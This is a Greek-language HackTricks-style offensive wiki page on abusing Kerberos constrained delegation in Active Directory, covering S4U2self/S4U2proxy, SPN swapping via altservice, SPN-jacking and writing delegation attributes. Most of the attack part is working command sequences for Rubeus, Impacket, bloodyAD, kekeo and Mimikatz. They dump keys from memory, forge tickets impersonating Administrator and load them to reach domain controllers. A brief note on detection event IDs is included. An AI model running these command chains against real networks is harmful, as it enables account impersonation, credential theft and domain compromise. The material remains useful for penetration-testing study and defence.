# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Με αυτό, ένας Domain admin μπορεί να **επιτρέψει** σε έναν υπολογιστή να **προσποιείται ότι είναι ένας χρήστης ή υπολογιστής** απέναντι σε οποιαδήποτε **υπηρεσία** ενός μηχανήματος.

- **Service for User to self (_S4U2self_):** Κάθε **service account που κατέχει ένα SPN** μπορεί συνήθως να αποκτήσει ένα TGS προς τον εαυτό του εκ μέρους ενός αυθαίρετου χρήστη. Αν ο λογαριασμός έχει επίσης το [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) στο _userAccountControl_, αυτό το TGS είναι **forwardable**, κάτι που καθιστά τη μετάβαση πρωτοκόλλου άμεσα χρήσιμη για την **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Ένα **service account** μπορεί να αποκτήσει ένα TGS εκ μέρους ενός χρήστη για τα SPN που αναφέρονται στο **msDS-AllowedToDelegateTo**. Το evidence ticket που χρησιμοποιείται στο S4U2Proxy πρέπει να είναι ένα **forwardable** ticket προς την υπηρεσία που εκτελεί το delegation: είτε ένα πραγματικό client-to-service ticket που καταγράφηκε από το θύμα είτε ένα που δημιουργήθηκε με **S4U2Self + T2A4D**.

**Σημείωση**: Αν ένας χρήστης έχει επισημανθεί στο AD ως «_Account is sensitive and cannot be delegated_» ή είναι μέλος των **Protected Users**, συνήθως **δεν θα μπορείτε να προσποιηθείτε ότι είστε** αυτός μέσω constrained delegation. Σε σύγχρονα domains, προτιμήστε υλικό **AES** αντί για παραδοχές που βασίζονται αποκλειστικά σε RC4 όταν στοχεύετε λογαριασμούς με ενεργοποιημένο delegation.

Αυτό σημαίνει ότι αν **παραβιάσετε το hash της υπηρεσίας**, μπορείτε να **προσποιηθείτε ότι είστε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους σε οποιαδήποτε **υπηρεσία** στα υποδεικνυόμενα μηχανήματα (πιθανό **privesc**).

Επιπλέον, **δεν θα έχετε πρόσβαση μόνο στην υπηρεσία που επιτρέπεται στον χρήστη να προσποιηθεί ότι χρησιμοποιεί, αλλά και σε οποιαδήποτε υπηρεσία**, επειδή το SPN (το όνομα υπηρεσίας που ζητείται) δεν ελέγχεται (στο ticket αυτό το μέρος δεν είναι κρυπτογραφημένο/υπογεγραμμένο). Επομένως, αν έχετε πρόσβαση στην **CIFS service**, μπορείτε επίσης να αποκτήσετε πρόσβαση στην **HOST service** χρησιμοποιώντας, για παράδειγμα, το flag `/altservice` στο Rubeus. Την ίδια αδυναμία εναλλαγής SPN εκμεταλλεύεται το **Impacket getST -altservice** και άλλα εργαλεία.

Επίσης, η **πρόσβαση στην LDAP service σε DC** είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Σημείωση χειριστή:** μην εμπιστεύεστε μόνο στιγμιότυπα οθόνης από **ADUC** ή BloodHound για τον έλεγχο **gMSA/sMSA**. Αυτοί οι λογαριασμοί συχνά δεν εμφανίζουν τη συνηθισμένη καρτέλα Delegation, επομένως απαριθμήστε απευθείας τα ακατέργαστα attributes **`userAccountControl`** και **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition έναντι Kerberos-only constrained delegation

Αν ο παραβιασμένος λογαριασμός έχει **T2A4D**, συνήθως μπορείτε να ολοκληρώσετε ολόκληρη την αλυσίδα **`S4U2Self -> S4U2Proxy`** έχοντας μόνο το service key/TGT.<sup>[[2]](#references)</sup>

Αν έχει μόνο **`msDS-AllowedToDelegateTo`** (την κλασική λειτουργία **"Use Kerberos only"**), η ανάθεση εξακολουθεί να μπορεί να γίνει αντικείμενο κατάχρησης, αλλά το ticket τεκμηρίωσης για το S4U2Proxy πρέπει να είναι ένα **forwardable user-to-service ticket** για την υπηρεσία που πραγματοποιεί την ανάθεση. Μία επιλογή είναι να καταγράψετε ένα victim TGS από το **LSASS/ccache** και να το τροφοδοτήσετε στο δεύτερο στάδιο (`/tgs:` στο Rubeus). Ένα **non-forwardable** ticket S4U2Self **δεν** αρκεί για κλασικό constrained delegation· αν αυτό είναι το μόνο ticket τεκμηρίωσης που έχετε, ελέγξτε το [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) αντί γι' αυτό.<sup>[[2]](#references)</sup>

Μια άλλη υπό όρους επιλογή είναι ένα πρώτο άλμα [RBCD](resource-based-constrained-delegation.md) προς την υπηρεσία που πραγματοποιεί την ανάθεση: αν παράγει ένα **forwardable** ticket για τον προβλεπόμενο χρήστη και την υπηρεσία, μπορείτε να δοκιμάσετε αυτό το ticket ως τεκμήριο για ένα επόμενο άλμα S4U2Proxy σε λειτουργία Kerberos-only. Επιβεβαιώστε τα flags του πρώτου ticket, το SPN της υπηρεσίας που πραγματοποιεί την ανάθεση, τη λίστα επιτρεπόμενων προορισμών της και τυχόν περιορισμούς ανάθεσης για τον χρήστη· ο έλεγχος ενός χαρακτηριστικού RBCD από μόνος του δεν αποδεικνύει ότι είναι εφικτό το δεύτερο άλμα.

### Σημειώσεις για constrained delegation μεταξύ domains (2025+)

Από τα **Windows Server 2012/2012 R2**, το KDC υποστηρίζει **constrained delegation μεταξύ domains/forests** μέσω επεκτάσεων S4U2Proxy. Οι σύγχρονες εκδόσεις (Windows Server 2016–2025) διατηρούν αυτήν τη συμπεριφορά και προσθέτουν δύο PAC SID για να υποδεικνύουν protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) όταν ο χρήστης έκανε κανονικά authentication.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) όταν μια υπηρεσία δήλωσε την ταυτότητα μέσω protocol transition.

Όταν χρησιμοποιείται protocol transition μεταξύ domains, αναμένετε να βρείτε το `SERVICE_ASSERTED_IDENTITY` μέσα στο PAC, επιβεβαιώνοντας ότι το βήμα S4U2Proxy πέτυχε.<sup>[[1]](#references)</sup>

### Εργαλεία Impacket / Linux (altservice & full S4U)

Οι πρόσφατες εκδόσεις του Impacket (0.11.x+) εκθέτουν την ίδια αλυσίδα S4U και την εναλλαγή SPN με το Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Αν προτιμάτε να κάνετε πρώτα forging του user ST (π.χ. όταν έχετε μόνο offline hash), συνδυάστε τα **ticketer.py** και **getST.py** για S4U2Proxy. Το **tgssub.py** είναι επίσης χρήσιμο όταν έχετε ήδη ένα λειτουργικό ccache και χρειάζεται μόνο να αλλάξετε την service class για τον ίδιο host. Δείτε το ανοιχτό issue #1713 του Impacket για γνωστά quirks (KRB_AP_ERR_MODIFIED όταν το forged ST δεν ταιριάζει με το κλειδί του SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: ανακατεύθυνση ενός στόχου constrained delegation

Το κλασικό constrained delegation εξουσιοδοτεί ένα **SPN string** στο `msDS-AllowedToDelegateTo`, όχι ένα αμετάβλητο target SID. Κατά το S4U2Proxy, ο KDC επιλύει τον λογαριασμό στον οποίο ανήκει εκείνη τη στιγμή το SPN και κρυπτογραφεί το service ticket με το μακροπρόθεσμο κλειδί αυτού του λογαριασμού. Επομένως, ο έλεγχος του delegating account σε συνδυασμό με `WriteSPN` σε έναν άλλο λογαριασμό υπηρεσίας/υπολογιστή μπορεί να ανακατευθύνει έναν αμετάβλητο περιορισμό delegation χωρίς `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Υπάρχουν δύο παραλλαγές:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** το επιτρεπόμενο SPN είναι ορφανό, επειδή ο προηγούμενος κάτοχός του διαγράφηκε, μετονομάστηκε ή αφαιρέθηκε το SPN από αυτόν. Προσθέστε το απευθείας στον επιθυμητό λογαριασμό-στόχο.
- **Live SPN-jacking:** το SPN εξακολουθεί να ανήκει σε έναν λογαριασμό-πηγή. Η επικύρωση διπλότυπων SPN συνήθως εμποδίζει την εγγραφή στον προορισμό, επομένως απαιτείται `WriteSPN` και στα δύο αντικείμενα: αφαιρέστε το από την πηγή, προσθέστε το στον στόχο, αποκτήστε το ticket και επαναφέρετε την αρχική καταχώριση.

Η ακόλουθη αφαιρετική ροή εργασίας σε Linux μεταφέρει ένα επιτρεπόμενο SPN, εκτελεί S4U ως ο παραβιασμένος delegating principal και ξαναγράφει το όνομα υπηρεσίας του ticket ώστε να αντιστοιχεί σε μια χρήσιμη υπηρεσία στον νέο στόχο.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

Το `-altservice` είναι το δεύτερο, ξεχωριστό primitive. Το ticket S4U2Proxy ήταν κρυπτογραφημένο για τον λογαριασμό που τώρα έχει στην κατοχή του το `$DELEGATED_SPN`· επειδή το όνομα υπηρεσίας του ticket (`sname`) βρίσκεται εκτός του κρυπτογραφημένου σώματος του ticket, τα εργαλεία μπορούν να αντικαταστήσουν την κλάση υπηρεσίας/το hostname με άλλο, του οποίου η υπηρεσία χρησιμοποιεί το ίδιο κλειδί λογαριασμού. Το SPN-jacking αλλάζει πρώτα **ποιο κλειδί λογαριασμού** προστατεύει το ticket, ενώ η αντικατάσταση κλάσης υπηρεσίας αλλάζει **πού παρουσιάζεται** αυτό το ticket.<sup>[[5]](#references)[[6]](#references)</sup>

Για live jacking, αντιστρέψτε τις δύο εγγραφές LDAP αμέσως μετά την απόκτηση του ticket, ώστε να αποφύγετε τη διακοπή λειτουργίας της νόμιμης υπηρεσίας. Σε DC με ενεργοποιημένο auditing λογαριασμών υπολογιστών, αναζητήστε το συμβάν Security **4742**, όπου το `servicePrincipalName` αφαιρείται από έναν υπολογιστή και προστίθεται σε άλλον λίγο αργότερα, ειδικά όταν το hostname του SPN διαφέρει από το `dNSHostName` του προορισμού. Συσχετίστε το με το συμβάν **4769**: το S4U2Self παρουσιάζει τον ίδιο λογαριασμό ως client/service, ενώ το S4U2Proxy συμπληρώνει το **Transited Services**.<sup>[[5]](#references)</sup>

### Ρύθμιση delegation σε ελεγχόμενο λογαριασμό

Αυτή η μέθοδος απαιτεί **αποτελεσματική πρόσβαση εγγραφής** στα χαρακτηριστικά delegation του λογαριασμού υπολογιστή ή υπηρεσίας (για παράδειγμα, `GenericAll` ή `WriteDACL` ακολουθούμενο από αλλαγή ACL) **και** το δικαίωμα χρήστη `SeEnableDelegationPrivilege` για τον λογαριασμό που κάνει την αλλαγή LDAP. Η Microsoft απαιτεί αυτό το δικαίωμα όταν τροποποιείται το `msDS-AllowedToDelegateTo`· τα δικαιώματα ελέγχου αντικειμένου από μόνα τους δεν παρακάμπτουν αυτή την απαίτηση. Ελέγξτε και τις δύο προϋποθέσεις πριν χρησιμοποιήσετε ένα LDAP client όπως το **bloodyAD** για να ορίσετε delegation με protocol transition.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Ένας υπάρχων λογαριασμός υπολογιστή μπορεί να είναι υποψήφιος ακόμη κι όταν το `ms-DS-MachineAccountQuota` είναι μηδέν· αυτό το όριο περιορίζει την προεπιλεγμένη διαδικασία δημιουργίας νέου υπολογιστή, όχι τα δικαιώματα σε ένα υπάρχον αντικείμενο. Για να χρησιμοποιήσετε τη ρυθμισμένη delegation, χρειάζεστε επίσης τον έλεγχο του κλειδιού ή του κωδικού πρόσβασης του λογαριασμού που αναθέτει, ένα έγκυρο service principal name και έναν χρήστη-στόχο του οποίου τα credentials επιτρέπεται να ανατεθούν. Αυτές οι προϋποθέσεις και η αποτελεσματική πρόσβαση στον κατάλογο πρέπει να ελέγχονται ξεχωριστά.

- Βήμα 1: **Λήψη TGT της επιτρεπόμενης υπηρεσίας**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Υπάρχουν **άλλοι τρόποι να αποκτήσετε ένα TGT ticket** ή το **RC4** ή το **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και το unconstrained delegation, το NTLM relaying και η κατάχρηση του Active Directory Certificate Service
>
> **Αρκεί να έχετε αυτό το TGT ticket (ή το hash του) για να εκτελέσετε αυτή την επίθεση χωρίς να παραβιάσετε ολόκληρο τον υπολογιστή.**

- Step2: **Λήψη TGS για την υπηρεσία, με πλαστοπροσωπία του χρήστη**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Επισκόπηση του Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Κατάχρηση Delegation με Impacket (Μέρος 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Το Kerberosity σκότωσε το domain: Μια επιθετική επισκόπηση του Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Μια οριακή περίπτωση κατάχρησης του WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
